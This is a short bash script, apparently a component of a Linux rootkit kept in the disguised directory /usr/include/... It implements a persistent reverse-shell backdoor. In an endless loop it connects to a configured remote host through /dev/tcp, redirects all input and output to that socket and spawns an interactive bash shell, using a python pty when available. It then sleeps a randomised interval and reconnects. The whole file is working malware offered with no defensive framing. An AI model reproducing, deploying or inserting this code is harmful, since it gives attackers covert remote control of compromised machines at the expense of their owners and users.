#!/bin/bash

BR_ROOTKIT_PATH="/usr/include/..."

. $BR_ROOTKIT_PATH/br_config.sh

function br_connect_backdoor()
{
	local target_ip=$br_remote_host
	local target_port=$br_remote_port
	local sleep_time=$br_sleep_time

	while [ 1 ]
	do	
		MAX_ROW_NUM=`stty size|cut -d " " -f 1`
		MAX_COL_NUM=`stty size|cut -d " " -f 2`
		{
		PS1='[\A j\j \u@\h:t\l \w]\$';export PS1
		exec 9<> /dev/tcp/$target_ip/$target_port
		[ $? -ne 0 ] && exit 0 || exec 0<&9;exec 1>&9 2>&1
		if type python >/dev/null;then
			export MAX_ROW_NUM MAX_COL_NUM
			python -c 'import pty; pty.spawn("/bin/bash")'
		else
			/bin/bash --rcfile $BR_ROOTKIT_PATH/.bdrc --noprofile -i
		fi
		}&
		wait

		sleep $((RANDOM%sleep_time+sleep_time))
	done
}

br_load_config $BR_ROOTKIT_PATH/br.conf
br_connect_backdoor
